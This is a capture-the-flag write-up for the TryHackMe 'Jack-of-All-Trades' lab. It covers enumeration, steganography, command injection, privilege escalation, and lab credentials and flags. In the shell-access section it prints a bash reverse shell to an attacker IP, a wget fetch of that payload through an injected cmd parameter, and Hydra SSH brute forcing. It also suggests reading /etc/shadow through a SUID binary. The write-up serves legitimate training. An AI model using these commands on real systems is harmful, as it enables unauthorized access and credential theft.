## Jack-of-All-Trades - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/jackofalltrades)

<i>Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him!
Can you see through his facade of a forgetful old toymaker and bring this lunatic down?</i>

**IP: 10.10.153.24**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Steganography, Brute Force <br>

**Tools Used**: Nmap, Gobuster, CyberChef, Steghide, Cipher Identifier, Hydra

[CyberChef](https://gchq.github.io/CyberChef/)<br>

[Cipher Identifier](https://www.dcode.fr/cipher-identifier)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration and Steganography

- Startng off with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.153.24
  
  PORT   STATE SERVICE VERSION
  22/tcp open  http    Apache httpd 2.4.10 ((Debian))
  |_http-server-header: Apache/2.4.10 (Debian)
  |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
  |_http-title: Jack-of-all-trades!
  80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
  |   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
  |   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
  |_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Well, this was weird, usually SSH is on 22 and HTTP on 80, when I visited `http://10.10.153.24:22/`, Firefox told me that the address is restricted. It took me a bit to bypass restriction but I got it.
  In Firefox search for `about:config` then in a config search bar type `network.security.ports.banned.override` and change the STRING value to 22. After that you can visit the target home page.
  
- Gobuster did well and I also found encoded message in source code of main page.

  ```
  gobuster dir -u http://10.10.153.24:22/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /assets               (Status: 301) [Size: 316] [--> http://10.10.153.24:22/assets/]
  /index.html           (Status: 200) [Size: 1605]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

  ```
  <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
  ```

- Alright, `http://10.10.153.24:22/recovery.php` is a login page so credentials are next process. I decoded the Base64 string in CyberChef and got a message for Jack.

  ```
  Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
  ```

- I immediately tried newly found password `u?WtKSraq` on both login page and SSH but it was unsuccessfull, on the login page source code there's another encoded string. It's a Base32, then hexadecimal into ROT-13 cipher.
  I wrote 2 Python scripts to decode them and then put ROT-13 cipher into Cipher Identifier and got the final message.

  ```
  GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=

  python3 decode.py
  python3 hex.py

  Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F

  Now reversing ROT-13 cipher

  Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
  ```

- Noice! That's something, when I checked `bit.ly/2TvYQ2S` it redirected me to Stego Wiki page `https://en.wikipedia.org/wiki/Stegosauria`. With message telling me that credentials are hidden on main page I moved back to it and downloaded my boi Stego image.

- Let's see if `steghide` can extract anything. Passphrase is the password from the message that I already found: `u?WtKSraq`.

  ```
  steghide --extract -sf stego.jpg
  Enter passphrase: 
  wrote extracted data to "creds.txt".
  
  u?WtKSraq -> passphrase
  
  cat creds.txt 
  Hehe. Gotcha!
  
  You're on the right path, but wrong image!
  ```

- OK, cool, I'm on the right path, so I did the same thing with jackinthebox image but found nothing. Luckily header image gave me everything I need for further exploitation.

  ```
  steghide --extract -sf header.jpg      
  Enter passphrase: 
  wrote extracted data to "cms.creds".
  
  cat cms.creds 
  Here you go Jack. Good thing you thought ahead!
  
  Username: jackinthebox
  Password: TplFxiSHjY
  ```

- Let's login with those credentials and look for flags!

---

## ⚙️ Shell Access

- So, when I logged in to the web page, I saw a message from Future-Jack: `GET me a 'cmd' and I'll run it for you Future-Jack. `. You can execute commands from URL! Let's test it.

  ```
  http://10.10.153.24:22/nnxhweOV/index.php?cmd=whoami

  GET me a 'cmd' and I'll run it for you Future-Jack. www-data www-data
  ```
  
- Successfull, now let's upload a shell and run it. I made this PHP one liner and started a listener. After uploading shell, just run it and you will get connection with netcat. Start a HTTP server with Python so you can move the shell to target's page.

  ```
  nano shell.php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'");

  python3 -m http.server 80

  http://10.10.153.24:22/nnxhweOV/index.php?cmd=wget http://[YOUR-THM-IP]:80/shell.php -O /tmp/shell.php
  http://10.10.153.24:22/nnxhweOV/index.php?cmd=php /tmp/shell.php

  nc -lvnp 4444                                                                 
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.153.24] 40890
  bash: cannot set terminal process group (707): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@jack-of-all-trades:/var/www/html/nnxhweOV$
  ```
  
- Connected, I changed it to my beloved Putty shell and started looking for flags.

  ```
  which python
  /usr/bin/python
  
  www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ python -c 'import pty; pty.spawn("/bin/bash")'
  <:/var/www/html/nnxhweOV$ python -c 'import pty; pty.spawn("/bin/bash")'     
  www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ ^Z
  zsh: suspended  nc -lvnp 4444
                                                                                                                      
  stty raw -echo; fg
  [1]  + continued  nc -lvnp 4444
                                 export TERM=xterm
  www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ whoami
  www-data
  ```

---

## 🧍 User Privilege Escalation

- I did some digging around after getting access, but `jack` directory was locked, couldn't access it, but when I checked the other file in /home directory `jacks_password_list` I got a list of few different passwords. Surely one is Jack's legit password right?

  ```
  www-data@jack-of-all-trades:/home$ cat jacks_password_list
  *hclqAzj+2GC+=0K
  eN<A@n^zI?FE$I5,
  X<(@zo2XrEN)#MGC
  ,,aE1K,nW3Os,afb
  ITMJpGGIqg1jn?>@
  0HguX{,fgXPE;8yF
  sjRUb4*@pz<*ZITu
  [8V7o^gl(Gjt5[WB
  yTq0jI$d}Ka<T}PD
  Sc.[[2pL<>e)vC4}
  9;}#q*,A4wd{<X.T
  M41nrFt#PcV=(3%p
  GZx.t)H$&awU;SO<
  .MVettz]a;&Z;cAC
  2fh%i9Pr5YiYIf51
  TDF@mdEd3ZQ(]hBO
  v]XBmwAk8vk5t3EF
  9iYZeZGQGG9&W4d1
  8TIFce;KjrBWTAY^
  SeUAwt7EB#fY&+yt
  n.FZvJ.x9sYe5s5d
  8lN{)g32PG,1?[pM
  z@e1PmlmQ%k5sDz@
  ow5APF>6r,y4krSo
  www-data@jack-of-all-trades:/home$ 
  ```
  
- Right now, just save this list in you Kali and brute force your way into SSH.

  ```
  hydra -l jack -P pwlist.txt ssh://10.10.153.24:80
  [80][ssh] host: 10.10.153.24   login: jack   password: ITMJpGGIqg1jn?>@
  1 of 1 target successfully completed, 1 valid password found
  ```
  
- Now login with SSH so you can get stable shell, go to `/home/jack` and get the user flag. The thing is flag is hidden in the picture lol. Download it to your Kali so you can view the flag.

  ```
  ssh jack@10.10.153.24 -p 80
  jack@10.10.153.24's password: 
  jack@jack-of-all-trades:~$ whoami
  jack
  jack@jack-of-all-trades:~$ cd /home/jack
  jack@jack-of-all-trades:~$ ls
  user.jpg
  ```

- User flag: `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`. Moving to root now.

---

## 👑 Root Privilege Escalation

- Final part of challenge is getting the root flag. I was digging around and enumerating and this is what worked perfectly.

  ```
  jack@jack-of-all-trades:~$ find / -type f -perm -4000 2>/dev/null
  /usr/lib/openssh/ssh-keysign
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/pt_chown
  /usr/bin/chsh
  /usr/bin/at
  /usr/bin/chfn
  /usr/bin/newgrp
  /usr/bin/strings
  /usr/bin/sudo
  /usr/bin/passwd
  /usr/bin/gpasswd
  /usr/bin/procmail
  /usr/sbin/exim4
  /bin/mount
  /bin/umount
  /bin/su
  ```
  
- Strings looks very phishy, which means I can read any file with it. On GTFOBins I found this `LFILE=file_to_read ; sudo strings "$LFILE"` but when I ran it with sudo I got denied again as `sudo -l` already told me. So i just ran it without sudo and got the flag.

  ```
  jack@jack-of-all-trades:~$ strings /root/root.txt
  ToDo:
  1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
  2.Make T-Rex model!
  3.Meet up with Johny for a pint or two
  4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
  5.Remember to finish that contract for Lisa.
  6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
  jack@jack-of-all-trades:~$ 
  ```
  
- BONUS: Try to escalate with `/etc/shadow` by using the same method, let me know how it went!

---

## 🏁 Flags

- **User Flag**: `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`
- **Root Flag**: `securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, but really good practice ngl.`

- What did I learn?
  `There was nothing new to learn for me except practicing Steganography and different attacks. Most importanly I had so much fun with this room and met my boi stego again. ❤️🦕`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
